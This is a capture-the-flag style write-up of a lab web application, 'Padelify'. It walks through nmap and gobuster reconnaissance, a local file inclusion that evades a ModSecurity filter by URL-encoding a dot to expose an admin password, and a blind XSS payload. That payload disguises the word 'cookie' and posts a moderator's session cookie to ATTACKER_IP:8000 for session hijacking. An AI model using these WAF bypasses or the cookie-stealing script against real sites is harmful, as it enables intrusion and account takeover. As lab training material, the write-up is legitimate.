# 1. Initial Scanning

## 1.1 TCP Scan

**Top 1000s scan**

>**Input**

`nmap -sC -sV -oA initial_scan 10.48.171.12`

>**Output**

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 42:53:ab:ac:fe:a8:df:23:a0:41:96:a0:3e:f9:d9:64 (ECDSA)
|_  256 dd:19:02:64:96:49:d0:c4:ca:01:43:a5:5d:87:0b:df (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Padelify - Tournament Registration
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

>[!NOTE]
> * **Port 22/tcp:** OpenSSH 9.6p1
> * **Port 80/tcp:** Apache httpd 2.4.58 (Target 0S: Ubuntu)

**Full Port Scan**

>**Input**

`nmap -p- --min-rate=1000 10.48.171.12`

>**Output**

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

>[!IMPORTANT]
>The full scan confirms that only SSH and an apache HTTP server are exposed on the target machine.
## 1.2 UDP Scan

>**Input**

```
sudo nmap -sU --top-ports 100 10.48.171.12 
```

>**Output**

```text
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
```

>[!NOTE]
> Only **port 68/udp (DHCPC)**  is open. This is standard for network configuration and likely irrelevant to the challenge.

# 2. Service Enumeration

## 2.1 HTTP Apache server in port 80

### 2.1.1 Site Structure and Manual Exploration

We manually mapped the application flow:

- **Public Area:** `index.html` (Registration), `login.php`
    
- **Authenticated Area:** `dashboard.php` (User Panel), `live.php`
    
- **Session Management:** Uses `PHPSESSID` cookies.
### 2.1.2 Directory Brute-Forcing

>**Input**

```bash
gobuster dir -u http://10.48.171.12 -w /usr/share/wordlists/dirb/common.txt -t 70 -x php,txt,html -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

>**Output**

```text
change_password.php  (Status: 302) [Size: 0] [--> login.php]
config               (Status: 301) [Size: 313] [--> http://10.48.171.12/config/]
css                  (Status: 301) [Size: 310] [--> http://10.48.171.12/css/]
dashboard.php        (Status: 302) [Size: 0] [--> login.php]
footer.php           (Status: 200) [Size: 33]
header.php           (Status: 200) [Size: 1587]
index.php            (Status: 200) [Size: 3853]
javascript           (Status: 301) [Size: 317] [--> http://10.48.171.12/javascript/]
js                   (Status: 301) [Size: 309] [--> http://10.48.171.12/js/]
live.php             (Status: 200) [Size: 1961]
login.php            (Status: 200) [Size: 1124]
logout.php           (Status: 302) [Size: 0] [--> index.php]
logs                 (Status: 301) [Size: 311] [--> http://10.48.171.12/logs/]
match.php            (Status: 200) [Size: 126]
php.ini              (Status: 403) [Size: 2872]
php.ini.txt          (Status: 403) [Size: 2872]
php.ini.html         (Status: 403) [Size: 2872]
php.ini.php          (Status: 403) [Size: 2872]
register.php         (Status: 302) [Size: 0] [--> index.php]
server-status        (Status: 403) [Size: 2872]
status.php           (Status: 200) [Size: 4086]
```

The scan found the endpoints we already mapped during the manual scan and some additional configuration files. We also ran an additional scan with `directory-list-lowercase-2.3-medium.txt` but it didn't return any new directory.

>[!NOTE]
> - **WAF Detected:** Direct access to configuration files (`php.ini`, `app.conf`) triggers a **403 Forbidden** response.
> - `logs/error.log` is accessible and contains sensitive debugging information.
> 

## 2.1.3 Log Analysis (`logs/error.log`)

We analyzed the `error.log` file, which revealed critical details about the application's structure and defense mechanisms:

```
[Sat Nov 08 12:05:02.452301 2025] [warn] [modsec:99000005] [client 10.10.84.50:53122] NOTICE: Possible encoded/obfuscated XSS payload observed
[Sat Nov 08 12:11:33.444200 2025] [error] [pid 2378] Failed to parse admin_info in /var/www/html/config/app.conf: unexpected format
[Sat Nov 08 12:13:55.888902 2025] [warn] [modsec:41004] [client 10.10.84.212:53210] Double-encoded sequence observed (possible bypass attempt)
```

>[!IMPORTANT]
>-  **Target Identified**: The logs explicitly mention a parsing error for `admin_info` located in `/var/www/html/config/app.conf`. This confirms the file path and suggests it contains sensitive credentials.
>
> - **WAF Identification:** The tags `[modsec:...]` confirm the server is protected by **ModSecurity**.
> 
>-  **Defense Logic:** The WAF rules observed (`99000005` and `41004`) indicate active protection against Obfuscated XSS and Double-URL Encoding, alerting us to avoid these specific evasion techniques.
# 3. Vulnerability Assessment

## 3.1 Local File Inclusion (LFI) via WAF Bypass

We discovered a **Local File Inclusion** vulnerability located at `/live.php?page=match.php`. Standard LFI attempts to read `config/app.conf` were blocked by the WAF. 

We successfully bypassed this filter using **URL Encoding** (Input Normalization Evasion). By changing the dot (`.`) to `%2E`, the WAF failed to recognize the restricted filename, while the PHP backend decoded and processed it correctly. 

>**Payload Used**

```text
http://10.48.171.12/live.php?page=config/app%2Econf
```

>**Output**

```
version = "1.4.2" enable_live_feed = true enable_signup = true env = "staging" site_name = "Padelify Tournament Portal" max_players_per_team = 4 maintenance_mode = false log_level = "INFO" log_retention_days = 30 db_path = "padelify.sqlite" admin_info = "bL}8,S9W1o44" misc_note = "do not expose to production" support_email = "support@padelify.thm" build_hash = "a1b2c3d4" 
```

>[!IMPORTANT]
>Successfully reading `app.conf` revealed sensitive configuration details, including potential credentials in the `admin_info` field: `bL}8,S9W1o44`
>
>Using these credentials (`admin:bL}8,S9W1o44`), we logged into the dashboard and retrieved the **Admin Flag**.

>[!CAUTION]
>- **SSTI:** We observed input reflection in `/register.php` (level/game_type) but payloads were sanitized via HTML Entity Encoding.

## 3.2 Cross-Site Scriptng (XSS) via WAF bypass

After gaining admin access, we analyzed the application logic. The "Pending Approval" status on the user profile suggested a **Blind XSS** vector: a Moderator bot likely reviews new user registrations.

While the `level` and `game_type` parameters were sanitized, we focused on the **`username`** field. Initial testing confirmed it was vulnerable to XSS, but ModSecurity blocked standard keywords like `fetch`, `document.cookie`, and even the string `'cookie'`.

To bypass this, we constructed a payload using **String Concatenation** to hide the keyword "cookie" and `XMLHttpRequest` to exfiltrate the data via a POST request.

**Payload Construction**

```
<script>
	x = "coo" + "kie";
	const xhr = new XMLHttpRequest();
	xhr.open("POST", "http://ATTACKER_IP:8000");
	xhr.setRequestHeader("Content-Type", "application/json");
	xhr.send(document[x]);
</script>
```

>[!IMPORTANT]
>- We registered a new user with the payload above as the **Username**.    
>- We started a custom Python server (`server.py`) configured to handle POST and OPTIONS (CORS) requests.  
>- Upon the Moderator bot reviewing the registration, our server received the `PHPSESSID`.
>- We hijacked the session using the stolen cookie, accessed the **Moderator Dashboard**, and retrieved the final flag.
